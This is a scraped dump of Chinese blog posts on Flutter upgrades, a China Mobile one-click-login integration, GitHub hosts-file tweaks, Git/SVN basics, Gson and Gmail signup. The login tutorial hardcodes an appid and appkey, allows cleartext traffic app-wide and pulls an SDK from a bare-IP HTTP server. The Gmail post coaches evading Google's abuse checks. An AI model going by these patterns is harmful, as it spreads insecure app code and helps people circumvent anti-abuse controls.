总的来说，Flutter 对广大开发者而言是 利远远大于弊的 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/04/22/%E3%80%90Flutter%E3%80%91flutter%E5%8F%91%E5%B1%95%E5%89%8D%E6%99%AF%E5%A6%82%E4%BD%95%EF%BC%9F/"},{"title":"【Flutter】解决升级Flutter3.0后出现警告Operand of null-aware operation ‘!‘ has type ‘WidgetsBinding‘ which excludes null","text":"# 【Flutter】解决升级 Flutter3.0 后出现警告 Operand of null-aware operation ‘!‘ has type ‘WidgetsBinding‘ which excludes null # 出现场景 将 Flutter SDK 升级到 3.0，运行时报以下警告。 虽然不影响程序的运行，但是看着很烦。 1234lib/stress_test/stress_test_page.dart:120:22: Warning: Operand of null-aware operation '!' has type 'WidgetsBinding' which excludes null. - 'WidgetsBinding' is from 'package:flutter/src/widgets/binding.dart' ('../../develop_env/flutter_3.0/packages/flutter/lib/src/widgets/binding.dart'). WidgetsBinding.instance!.addPostFrameCallback((timeStamp) { ^ # 解决方案 这是因为在 Flutter 3.0 中，binding 的 instance 是不可为空的，所以不需要使用 ! 。 下面有 2 种情况。 # 三方依赖库 如果是依赖的库要使用到了 Binding.instance，去 pub 上看看库的新版本有没有兼容 3.0。如果有就升级库的版本。 比如我的项目用到了 getx 4.6.1，是 Flutter 3.0 出来之前的版本。 1234../../develop_env/flutter_3.0/.pub-cache/hosted/pub.flutter-io.cn/get-4.6.1/lib/get_state_manager/src/simple/get_controllers.dart:96:20: Warning: Operand of null-aware operation '!' has type 'WidgetsBinding' which excludes null. - 'WidgetsBinding' is from 'package:flutter/src/widgets/binding.dart' ('../../develop_env/flutter_3.0/packages/flutter/lib/src/widgets/binding.dart'). WidgetsBinding.instance!.removeObserver(this); ^ 去 pub 上查看更新记录 (changelog)，可以看到 4.6.2 兼容了 Flutter 3.0。 1234567891011121314[4.6.5] #Fix pub dev score[4.6.4] Added backward compatibility with flutter 2.[4.6.3] Fix SDK constraints[4.6.2] Added compatibility with flutter 3.0[4.6.1] Fix GetConnect on Flutter web 所以我们只需要将 get 的版本更改为 4.6.2 或以上即可。 123dependencies: # get: ^4.6.1 get: ^4.6.2 # 本地代码 如果是项目中有用到 Binding.instance，可以使用 dart 命令 dart fix --apply 自动修复，这样就会自动把 instance 后面的 ! 去掉。 1234567891011adodeMacBook-Pro:fusion_pro wangyang$ dart fix --applyComputing fixes in fusion_pro... 105.4sApplying fixes... 0.0slib/pages/splash_page.dart UNNECESSARY_NON_NULL_ASSERTION • 1 fixlib/stress_test/stress_test_page.dart UNNECESSARY_NON_NULL_ASSERTION • 1 fix2 fixes made in 2 files. # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/08/09/%E3%80%90Flutter%E3%80%91%E8%A7%A3%E5%86%B3%E5%8D%87%E7%BA%A7Flutter3.0%E5%90%8E%E5%87%BA%E7%8E%B0%E8%AD%A6%E5%91%8AOperand%20of%20null-aware%20operation%20%E2%80%98!%E2%80%98%20has%20type%20%E2%80%98WidgetsBinding%E2%80%98%20which%20excludes%20null/"},{"title":"Flutter集成中国移动一键登录业务，亲测可行","text":"# Flutter 集成中国移动一键登录业务 #本文适用于 Flutter 平台开发的小伙伴需要所谓一键登录的业务 先贴上链接 中国移动互联网能力开放平台：https://dev.10086.cn 号码认证 Android_5.9.5 接入文档：http://dev.10086.cn/dev10086/pub/loadAttach?attachId=9324E5A5EB8E4DF5BC5118221A93D3ED 移动认证服务端接入文档：https://dev.10086.cn/dev10086/pub/loadAttach?attachId=6EF75FD09D4F40D1973CB7C36C3DB2E2 话不多说，直接上正题，本文比某 SDN 的质量高不知道多少倍呢。 # 1. 准备工作 # 1.1 注册账号并创建一个应用 ​ # 1.2 下载好统一认证 SDK，这里使用的版本是 quick_login_android_5.9.5.jar 请求我的服务器下载：http://43.143.40.221:8080/quick_login_android_5.9.5.rar 下载好后解压 # 1.3 在移动开发平台申请好应用拿到 appid、appkey # 2. 开始接入 # 2.1 使用 AS 打开你的项目，新建 lib 文件夹，导入 quick_login_android_5.9.5.jar ，右键 asLibirary，导入库 打开项目视图 点击 APP 栏位，出现 quick_login_android_5.9.5.jar 即可 # 2.2 在 app 级别下的 build.gradle 中的 dependencies 栏位导入依赖，使用相对路径引入即可 1234dependencies { ··· implementation files('..\\\\lib\\\\quick_login_android_5.9.5.jar')} # 2.3 打开 AndroidManifest.xml 在 application 引入 android:networkSecurityConfig=&quot;@xml/network_security_config&quot; 同时，在 res 目录下新建一个 xml 目录 新建 network_security_config.xml 文件 引入以下代码 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;network-security-config&gt; &lt;base-config cleartextTrafficPermitted=&quot;true&quot; /&gt;&lt;/network-security-config&gt; 下一步、将 SDK 集成的 GenLoginAuthActivity 引入主文件 1234567&lt;activity android:name=&quot;com.cmic.gen.sdk.view.GenLoginAuthActivity&quot; android:configChanges=&quot;orientation|keyboardHidden|screenSize&quot; android:screenOrientation=&quot;unspecified&quot; android:theme=&quot;@style/AuthPage&quot; android:launchMode=&quot;singleTop&quot;&gt;&lt;/activity&gt; 同时，在 res 目录下的两个 values 文件中的 styles.xml 中引入代码：（两个都需要引入） 12345&lt;style name=&quot;AuthPage&quot; parent=&quot;@android:style/Theme.Holo.Light.NoActionBar&quot;&gt; &lt;item name=&quot;android:background&quot;&gt;@null&lt;/item&gt; &lt;item name=&quot;android:colorBackground&quot;&gt;@null&lt;/item&gt; &lt;item name=&quot;android:windowIsTranslucent&quot;&gt;true&lt;/item&gt;&lt;/style&gt; 下一步、引入权限代码： 1234&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.CHANGE_NETWORK_STATE&quot; /&gt; 至此、主文件配置完成！ # 2.4 将上面压缩包文件中 SDK 提供的 Demo 程序中的 res-umc 文件目录引入到我们的 main 目录中，与 res 同级 将 res-umc 目录下的文件复制进入 res 最终效果： # 2.5 打开 kotlin 下的 MainActivity.kt ，将代码全部复制进入，如果导不到包可以看看你的 Jar 包有没有成功引入 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.example.mobiledemoimport android.os.Bundleimport android.widget.Toastimport com.cmic.gen.sdk.auth.GenAuthnHelperimport com.cmic.gen.sdk.auth.GenTokenListenerimport com.cmic.gen.sdk.view.GenAuthThemeConfigimport io.flutter.Logimport io.flutter.embedding.android.FlutterActivityimport io.flutter.plugin.common.MethodChannelimport io.flutter.plugins.GeneratedPluginRegistrantimport org.json.JSONObjectclass MainActivity : FlutterActivity() { private var mHelper: GenAuthnHelper? = null override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) MethodChannel( getFlutterEngine()?.getDartExecutor()?.getBinaryMessenger(), &quot;TYRZ&quot; ).setMethodCallHandler { methodCall, result -&gt; if (methodCall.method == &quot;loginAuth&quot;) { loginAuth(result) } else { Log.e(&quot;TYRZ&quot;, &quot;notImplemented&quot;) result.notImplemented() } } //创建AuthnHelper实例 mHelper = GenAuthnHelper.getInstance(this) //打开SDK日志打印开关 GenAuthnHelper.setDebugMode(true) //初始化授权页主题 mHelper?.setAuthThemeConfig(GenAuthThemeConfig.Builder().build()) getFlutterEngine()?.let { GeneratedPluginRegistrant.registerWith(it) } } /** * 统一认证SDK授权方法调用 */ private fun loginAuth(result: MethodChannel.Result) { //调用授权方法，这里要填写的appid、appkey为开发者在移动开发平台申请的appid、appkey mHelper?.loginAuth( &quot;300012327504&quot;, &quot;2FDF3FA644E7476FE6733E123D968A82&quot;, object : GenTokenListener { override fun onGetTokenComplete(i: Int, jsonObject: JSONObject) { try { val resultCode = jsonObject.optString(&quot;resultCode&quot;, &quot;没有返回码！&quot;) Toast.makeText(this@MainActivity, resultCode, Toast.LENGTH_SHORT).show() //将结果回传给flutter result.success(resultCode) } catch (e: Exception) { e.printStackTrace() } } }) }} # 3. 运行调试 3.1 demo 代码如下： 核心逻辑： 12//调用方法通道 TYRZ，即我们在MainActivity中注册的方法，调用loginAuth登录方法String result = await const MethodChannel(&quot;TYRZ&quot;).invokeMethod(&quot;loginAuth&quot;); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import 'package:flutter/material.dart';import 'package:flutter/services.dart';void main() =&gt; runApp(MyApp());class MyApp extends StatelessWidget { @override Widget build(BuildContext context) { return MaterialApp( title: 'Flutter Demo', theme: ThemeData( primarySwatch: Colors.blue, ), home: MyHomePage(title: 'Flutter Demo Home Page'), ); }}class MyHomePage extends StatefulWidget { MyHomePage({Key? key, this.title}) : super(key: key); String? title; @override _MyHomePageState createState() =&gt; _MyHomePageState();}class _MyHomePageState extends State&lt;MyHomePage&gt; { //调用java方法 void loginAuth() async { print(&quot;按钮点击！&quot;); try { String result = await const MethodChannel(&quot;TYRZ&quot;).invokeMethod(&quot;loginAuth&quot;); //打印统一认证回调的响应码 print(&quot;resultCode = &quot; + result); } catch (e) { print(e); } } //创建一个按钮，在点击按钮时调用统一认证的loginAuth方法拉起授权页。 @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( title: Text(widget.title!), ), body: Center( child: Column( mainAxisAlignment: MainAxisAlignment.center, children: &lt;Widget&gt;[ RaisedButton( child: const Text(&quot;一键登录&quot;), onPressed: () { loginAuth(); }, ), ], ), ), ); }} # 结果：成功打印 客户端部分就此结束。 # 服务端接入认证并请求移动接口获取用户手机号： 贴上部分代码： 123456789101112131415161718192021String mobile; HashMap&lt;String, String&gt; res = null; Map&lt;Object, Object&gt; result = new HashMap&lt;&gt;(); try { //获取到结果 res = JSONObject.parseObject(post(CHINA_MOBILE_OBTAINS_MOBILE_PHONE_NUMBER, JSONObject.toJSONString(getMD5NoEncryPtionRequestParamMap(token))), HashMap.class); //结果集判断 if (AssertUtil.isEmpty(res) || !res.containsKey(&quot;msisdn&quot;)) { logger.error(&quot;一键登录异常：{},{}&quot;, res, ResponseCode.MOBILE_LOGIN_EXCEPTION.desc());// 一键登录异常 result.put(ResponseCode.MOBILE_LOGIN_EXCEPTION.code(), ResponseCode.MOBILE_LOGIN_EXCEPTION.desc()); return result; } else { //获取到手机号 mobile = res.get(&quot;msisdn&quot;); } } catch (Exception e) { logger.error(&quot;一键登录异常：{},{}&quot;, res, ResponseCode.MOBILE_LOGIN_EXCEPTION.desc());// 一键登录异常 result.put(ResponseCode.MOBILE_LOGIN_EXCEPTION.code(), ResponseCode.MOBILE_LOGIN_EXCEPTION.desc()); return result; } MD5 加密签名 1234567891011/** * Calculates the MD5 digest and returns the value as a 32 character hex string. * * @param data Data to digest * @return MD5 digest as a hex string */public static String md5Hex(String data) { return org.apache.commons.codec.digest.DigestUtils.md5Hex(data).toUpperCase();} 获取请求集合： 1234567891011121314151617181920/** * 获取MD5加密方式的无对称加密的请求集合 * * @param token * @return */ private HashMap&lt;String, String&gt; getMD5NoEncryPtionRequestParamMap(String token) { HashMap&lt;String, String&gt; param = new HashMap&lt;&gt;(); String msgId = UserUtil.createUUID(); String time = new SimpleDateFormat(&quot;yyyyMMddHHmmssSSS&quot;).format(new Date()); param.put(&quot;version&quot;, &quot;2.0&quot;); param.put(&quot;msgid&quot;, msgId); param.put(&quot;systemtime&quot;, time); param.put(&quot;strictcheck&quot;, &quot;0&quot;); param.put(&quot;appid&quot;, appId); param.put(&quot;token&quot;, token); param.put(&quot;encryptionalgorithm&quot;, &quot;&quot;); param.put(&quot;sign&quot;, md5Hex(appId + &quot;2.0&quot; + msgId + time + &quot;0&quot; + token + APPSecret)); return param; } post 请求方法： 12345678910111213141516171819202122232425262728public static String post(String URL, String json) { HttpClient client = new DefaultHttpClient(); HttpPost post = new HttpPost(URL); post.setHeader(&quot;Content-Type&quot;, &quot;application/json&quot;); String result = &quot;&quot;; try { StringEntity s = new StringEntity(json, &quot;UTF-8&quot;); s.setContentEncoding(new BasicHeader(HTTP.CONTENT_TYPE, &quot;application/json&quot;)); post.setEntity(s); // 发送请求 HttpResponse httpResponse = client.execute(post); // 获取响应输入流 InputStream inStream = httpResponse.getEntity().getContent(); BufferedReader reader = new BufferedReader(new InputStreamReader( inStream, &quot;utf-8&quot;)); StringBuilder strber = new StringBuilder(); String line = null; while ((line = reader.readLine()) != null) strber.append(line + &quot;\\n&quot;); inStream.close(); result = strber.toString(); } catch (Exception e) { throw new RuntimeException(e); } return result; } # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/01/21/%E3%80%90Flutter%E3%80%91Flutter%E9%9B%86%E6%88%90%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8%E4%B8%80%E9%94%AE%E7%99%BB%E5%BD%95%E4%B8%9A%E5%8A%A1%EF%BC%8C%E4%BA%B2%E6%B5%8B%E5%8F%AF%E8%A1%8C/"},{"title":"Github访问加速方法","text":"# 1. 获取延迟最小 IP 地址 首先，打开 http://tool.chinaz.com/dns?type=1&amp;host=github.com&amp;ip= 查询 Github 的地址，选择延迟最小的 # 2. 修改系统 Hosts 文件 接着，打开系统 hosts 文件 (需管理员权限)。 路径：C:\\Windows\\System32\\drivers\\etc mac 或者其他 linux 系统的话，是 /etc 下的 hosts 文件，需要切入到 root 用户修改 123456789101112131415161718192021222324252627# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 52.192.72.89 github.com 并在末尾添加记录并保存。(需管理员权限，注意 IP 地址与域名间需留有空格) # 3. 刷新系统 DNS 缓存 最后，Windows+X 打开系统命令行（管理员身份）或 powershell 运行 ipconfig /flushdns 手动刷新系统 DNS 缓存。 mac 系统修改完 hosts 文件，保存并退出就可以了。不要要多一步刷新操作. centos 系统执行 /etc/init.d/network restart 命令 使得 hosts 生效 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/10/27/%E3%80%90Git%E3%80%91Github%E8%AE%BF%E9%97%AE%E5%8A%A0%E9%80%9F/"},{"title":"SVN&amp;Git使用手册","text":"切记 代码是先更新再提交. （一）SVN 和 GIt 区别 1．基本 SVN 是集中式版本控制工具 git 是分布式版本控制工具 2．SVN 和 Git 优缺点 svn 优点: 1. 方便管理者查看每个开发者开发进度 2. 方便对开发者进行权限控制 svn 缺点: 1. 严重依赖网络环境进行版本控制 2. 中央服务器宕机，无法进行版本控制 3. 中央服务器磁盘损坏，丢失历史版本内容 Git 优点: 1. 很完美的解决了 SVN 存在的缺点 TortoiseGit 小乌龟 给当前项目提交到码云上 1. 用浏览器登录码云，在码云上创建一个仓库 2. 打开 TortoiseGit 软件 3. 新建一个文件夹改好名字 (注意是空文件夹) 4. 右键文件夹–&gt;Git 克隆…–&gt; 弹出如下图–&gt; 粘贴好 url 5. 点击确定就可以了 6. 然后就给你自己的代码放入刚才的文件夹下，然后就点击推送等等. 2．设置用户名和邮箱 直接设置即可。签名密钥不需要管 Git 使用笔记 （一）概念 1．什么是版本控制 版本控制是一种记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统。 除了项目源代码，你可以对任何类型的文件进行版本控制。 2．为什么要版本控制 有了它你就可以将某个文件回溯到之前的状态，甚至将整个项目都回退到过去某个时间点的状态，你可以比较文件的变化细节，查出最后是谁修改了哪个地方，从而找出导致怪异问题出现的原因，又是谁在何时报告了某个功能缺陷等等。 许多人习惯用复制整个项目目录的方式来保存不同的版本，或许还会改名加上备份时间以示区别。 这么做唯一的好处就是简单，但是特别容易犯错。 有时候会混淆所在的工作目录，一不小心会写错文件或者覆盖意想外的文件。 为了解决这个问题，人们很久以前就开发了许多种本地版本控制系统，大多都是采用某种简单的数据库来记录文件的历次更新差异。 3．集中化的版本控制系统 接下来人们又遇到一个问题，如何让在不同系统上的开发者协同工作？ 于是，集中化的版本控制系统（Centralized Version Control Systems，简称 CVCS）应运而生。 集中化的版本控制系统都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。 这么做虽然解决了本地版本控制系统无法让在不同系统上的开发者协同工作的诟病，但也还是存在下面的问题： 单点故障： 中央服务器宕机，则其他人无法使用；如果中心数据库磁盘损坏有没有进行备份，你将丢失所有数据。本地版本控制系统也存在类似问题，只要整个项目的历史记录被保存在单一位置，就有丢失所有历史更新记录的风险。 必须联网才能工作： 受网络状况、带宽影响。 4．分布式版本控制系统 于是分布式版本控制系统（Distributed Version Control System，简称 DVCS）面世了。 Git 就是一个典型的分布式版本控制系统。 这类系统，客户端并不只提取最新版本的文件快照，而是把代码仓库完整地镜像下来。 这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。 因为每一次的克隆操作，实际上都是一次对代码仓库的完整备份。 分布式版本控制系统可以不用联网就可以工作，因为每个人的电脑上都是完整的版本库，当你修改了某个文件后，你只需要将自己的修改推送给别人就可以了。但是，在实际使用分布式版本控制系统的时候，很少会直接进行推送修改，而是使用一台充当 “中央服务器” 的东西。这个服务器的作用仅仅是用来方便 “交换” 大家的修改，没有它大家也一样干活，只是交换修改不方便而已。 分布式版本控制系统的优势不单是不必联网这么简单，后面我们还会看到 Git 极其强大的分支管理等功能。 5．Git 与其他版本管理系统的主要区别 Git 在保存和对待各种信息的时候与其它版本控制系统有很大差异，尽管操作起来的命令形式非常相近，理解这些差异将有助于防止你使用中的困惑。 下面我们主要说一个关于 Git 其他版本管理系统的主要差别：对待数据的方式。 Git 采用的是直接记录快照的方式，而非差异比较。我后面会详细介绍这两种方式的差别。 大部分版本控制系统（CVS、Subversion、Perforce、Bazaar 等等）都是以文件变更列表的方式存储信息，这类系统将它们保存的信息看作是一组基本文件和每个文件随时间逐步累积的差异。 具体原理如下图所示，理解起来其实很简单，每个我们对提交更新一个文件之后，系统记录都会记录这个文件做了哪些更新，以增量符号 Δ(Delta) 表示。 我们怎样才能得到一个文件的最终版本呢？ 很简单，高中数学的基本知识，我们只需要将这些原文件和这些增加进行相加就行了。 这种方式有什么问题呢？ 比如我们的增量特别特别多的话，如果我们要得到最终的文件是不是会耗费时间和性能。 Git 不按照以上方式对待或保存数据。 反之，Git 更像是把数据看作是对小型文件系统的一组快照。 每次你提交更新，或在 Git 中保存项目状态时，它主要对当时的全部文件制作一个快照并保存这个快照的索引。 为了高效，如果文件没有修改，Git 不再重新存储该文件，而是只保留一个链接指向之前存储的文件。 Git 对待数据更像是一个 快照流。 6．使用 git 原因 分布式版本控制工具 为什么使用 git 呢？ 互联网项目，业务越来越复杂，项目越来越大，使用 SVN 版本控制不太好使了。 从 git 目标，看 git 的优势 速度快、分布式、有能力管理大型项目 7．工作流程以及流程图 在工作目录中修改文件。 暂存文件，将文件的快照放入暂存区域。 提交更新，找到暂存区域的文件，将快照永久性存储到 Git 仓库目录。 8．程序员工作流程 项目经理：1 创建项目 2 项目添加本地暂存态 3 项目提交到本地 4 建立远程连接 5 推送代码到远程服务器 程序员 A：1 克隆代码到本地 2 编写代码，将代码添加本地暂存态 3 代码提交本地 4 推送代码到服务器 程序员 B：1 克隆代码到本地 2 编写代码，将代码添加本地暂存态 3 代码提交本地 4 推送代码到服务器 5 更新其他程序员提交的代码 9．git 三种状态 已提交（committed）：数据已经安全的保存在本地数据库中。 已修改（modified）：已修改表示修改了文件，但还没保存到数据库中。 已暂存（staged）：表示对一个已修改文件的当前版本做了标记，使之包含在下次提交的快照中。 由此引入 Git 项目的三个工作区域的概念：Git 仓库 (.git directoty) 、工作目录 (Working Directory) 以及 暂存区域 (Staging Area) 。 （二）Git 分支 1．分支概念 几乎每一种版本控制系统都以某种形式支持分支。使用分支意味着你可以从开发主线上分离开来，然后在不影响主线的同时继续工作。在很多版本控制系统中，这是个昂贵的过程，常常需要创建一个源代码目录的完整副本，对大型项目来说会花费很长时间。 有人把 Git 的分支模型称为 “必杀技特性”，而正是因为它，将 Git 从版本控制系统家族里区分出来。Git 有何特别之处呢？Git 的分支可谓是难以置信的轻量级，它的新建操作几乎可以在瞬间完成，并且在不同分支间切换起来也差不多一样快。和许多其他版本控制系统不同，Git 鼓励在工作流程中频繁使用分支与合并，哪怕一天之内进行许多次都没有关系。理解分支的概念并熟练运用后，你才会意识到为什么 Git 是一个如此强大而独特的工具，并从此真正改变你的开发方式。 2．分支需求 现在让我们来看一个简单的分支与合并的例子，实际工作中大体也会用到这样的工作流 程： 开发某个网站。 为实现某个新的需求，创建一个分支。 在这个分支上开展工作。 假设此时，你突然接到一个电话说有个很严重的问题需要紧急修补，那么可以按照下面的方 式处理： 返回到原先已经发布到生产服务器上的分支。 为这次紧急修补建立一个新分支。 测试通过后，将此修补分支合并，再推送到生产服务器上。 切换到之前实现新需求的分支，继续工作。 （三）git 指令 1．创建 git 目录 git init 创建 git 目录: 该命令将创建一个名为 .git 的子目录，这个子目录含有你初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。但是，在这个时候，我们仅仅是做了一个初始化的操作，你的项目里的文件还没有被跟踪。(参见 Git 内部原理 来了解更多关于到底 .git 文件夹中包含了哪些文件的信息。) 2．克隆仓库 git clone [url] 克隆仓库的命令格式是 git clone [url] 。比如，要克隆 Git 的可链接库 libgit2，可以用下面的命令 $ git clone https://github.com/libgit2/libgit2 这会在当前目录下创建一个名为 “libgit2” 的目录，并在这个目录下初始化一个 .git 文件夹，从远程仓库拉取下所有数据放入 .git 文件夹，然后从中读取最新版本的文件的拷贝。如果你进入到这个新建的 libgit2 文件夹，你会发现所有的项目文件已经在里面了，准备就绪等待后续的开发和使用。如果你想在克隆远程仓库的时 候，自定义本地仓库的名字，你可以使用如下命令 $ git clone https://github.com/libgit2/libgit2 mylibgit 这将执行与上一个命令相同的操作，不过在本地创建的仓库名字变为 mylibgit 3．查看文件状态 git status 要查看哪些文件处于什么状态，可以用 git status 命令。如果在克隆仓库后立即使用此命令，会看到类似这 样的输出. 跟踪新文件 （四）使用 1．安装 git http://note.youdao.com/noteshare?id=448878ab8bdba693717f8967e6aa6a4f 2．将项目上传到码云上 如果账户已经配置好，git 客户端也安装好，在将要上传的文件中，右键打开 Git Bash Here, 按如下步骤即可： 1.git init 2.git remote add origin “你的码云项目地址（ssh 或 https）” 开始提交项目 3.git pull origin master 如果密码报错看下面 4.git touch init .txt // 如果已经存在更改的文件，则操作这一步，否则跳过即可 5.git add . 6.git commit -m “第一次提交（提交信息）” 7.git push origin master 如出现错误 hint: Updates were rejected because the tip of your current branch is behind hint: its remote counterpart. Integrate the remote changes (e.g. hint: ‘git pull …’) before pushing again. hint: See the ‘Note about fast-forwards’ in ‘git push --help’ for details. 可执行此操作继续，git push -u origin master -f 强制命令会覆盖别人分支，慎用 密码报错在这里进行修改 3．用 git 从 github 上下载代码 新建一个文件夹，放你需要下载的东西。右键点击 “Git Bash Here” 此时会弹出 git 的命令窗口 3、输入 git clone + 下载地址，回车即可。如 git clone https://github.comxxx.git 等待下载 下载好之后，文件夹里就会出现相应的项目啦～ （五）GitGUI 操作 1．使用 gui 上传代码到码云上 https://blog.csdn.net/qq_33867131/article/details/80831491 SVN 的基本使用 （一）基本简介 开源的版本控制系统，可以用来保存代码，同步代码，也可以保存图片文档电影什么的. 主要作用就是可以随时进行代码同步。但是会存在一些问题，会有一些解决方案 （二）服务端创建仓库 1．搭建仓库，添加用户 http://note.youdao.com/noteshare?id=549663e56580a3643bbcc9104c357226 2．分配权限 创建好用户后，用户还是不能访问我们的仓库，接下来我们要给用户分个组（如果想让用户不进组也能访问仓库，可以直接给单个用户权限 3．给代码放到 svn 上面 然后复制仓库地址 在你要上传的项目右键 然后点击确定 （三）错误解决 1．代码错乱问题 去查看日志，下载正确的时间段的代码，然后再创建新的仓库，放那个代码，原来的仓库就删除掉就可以了. 2．No appropriate protocol 公司的 SVN 协议从 svn 协议变更到 https 协议，结果 IDEA 的 SVN 报 No appropriate protocol，查询资料，最终解决方案是： Go to Preferences &gt; Version Control &gt; SubVersion &gt; Enable Interactive Mode 3．versionControl 里面找不到 subversion 选项 去安装 svnToolBox 插件 即可解决 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/02/01/%E3%80%90Git%E3%80%91SVN&Git%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"},{"title":"【GOSN】Gosn是什么？怎么使用？","text":"# Gson 是 google 开发的一个开源 Json 解析库，使用十分的方便，在 maven 当中导入的方式为： 12345&lt;dependency&gt; &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt; &lt;artifactId&gt;gson&lt;/artifactId&gt; &lt;version&gt;2.8.2&lt;/version&gt; &lt;/dependency&gt; 其中 2.8.2 为版本号，最新版本以及源码可以在官方的 github 上查看：https://github.com/google/gson 这里给出最简单的 Gson 的使用方法： 123456789Object obj = new Object(); //Object转Json字符串 String obstr = new Gson().toJson(object); //Json字符串转Object Object object = new Gson().fromJson(obstr); # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/11/30/%E3%80%90GOSN%E3%80%91Gosn%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E6%80%8E%E4%B9%88%E4%BD%BF%E7%94%A8%EF%BC%9F/"},{"title":"【Gmail】国内怎么注册Gmail邮箱？","text":"# 【Gmail】国内怎么注册 Gmail 邮箱？ ​ 谷歌邮箱（Gmail）是在国际上使用最为频繁的邮箱，不管我们是用来收发邮件，还是用来注册国外的网站，大多数情况下都离不开谷歌邮箱。甚至，不少网站都直接支持谷歌邮箱登录，这就是为什么，国内很多网友想要注册 Gmail 谷歌邮箱的原因。 ​ 但是，大部分网友都无法自己完整注册，今天来做一篇完整的谷歌邮箱注册教程，非常详细，一步一步照做即可！ ​ # 谷歌邮箱怎么注册？ # 注册前准备 1、手机号码一个（没有注册过谷歌邮箱的手机号码） 2、加速器（魔法）（国内使用谷歌，必须要加速器才行哦，加速器需自备，不然你会连谷歌邮箱官网都无法进入） # 谷歌 Gmail 邮箱注册教程 1、我们使用浏览器打开谷歌邮箱官网（gmail.google.com），进入谷歌邮箱的登录主页，我们点击左下方的创建账号按钮，选择个人用途。 2、在进入的界面我们不要着急填写资料，我们先修改语言，点击左下方的简体中文。 3、这个时候，会弹出国家语言列表，我们选择 “English（United States）”。 4、这个时候，界面会变成英语。我们在填写个人信息，如下图填写。填好过后，我们要记住账号和密码信息哦，后面登录要用的。 5、这个时候，会跳转到手机号码验证页面，我们选择中国 + 86，填写自己的手机号，点击 Next。如果顺利，你会进入下一步，填写验证码。如果你的加速器美国 IP 质量不行，这里就会提示你 “此电话号码无法用于验证”。遇到这个提示，建议，切换一个优质美国 IP，在操作。 6、输入手机收到的验证码，点击 “verify”。 7、这个界面，我们只需要填写出生日期即可，别的可不填。出生日期，大家一定要选择成年的年龄哦，别乱填，填好点 next。 8、来到这个界面，我们不用管，直接点击 skip。 9、隐私条款确认，我们点击 I agree。 这个时候，你会发现，账号注册成功了，并且，页面会直接跳转到谷歌邮箱的界面。 # 注册失败原因汇总 其实注册流程并不复杂，很简单，也就只需要几步。可是，国内的网友注册，总是无法注册成功。这里，把最容易导致注册失败的原因，给大家汇总一下，自己操作的时候就要注意了！ # 1、手机号码注册过 你用来注册谷歌邮箱的手机号码，你自己之前注册过谷歌邮箱，再次注册有可能会出现无法注册的情况。虽然，谷歌没有说明一个手机能够不能注册多个账号，但是，我们最好还是不要用注册过的手机号。 # 2、加速器 IP 质量不行 很多网友使用的加速器，IP 地址已经被人多次用来注册过谷歌邮箱了，到你注册的时候，早就被谷歌锁定了，识别你为恶意注册。这种情况，自然无法成功注册。那么，怎么才算高质量的 IP 地址呢？我们尽量使用那些没怎么被人用过的 IP，冷僻的线路即可。 # 3、语言没设置 大家看教程，应该知道，我注册的时候是设置了英语的。再加上使用的 IP 为美国，这样自然，谷歌会认为我是一个美国人在注册，审核机制自然就成了美区的审核机制，没那么严格，成功率会高一些。 # 4、如果以上都不行，那么建议使用 IPHONE 手机注册一下试试，很大几率可以成功！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 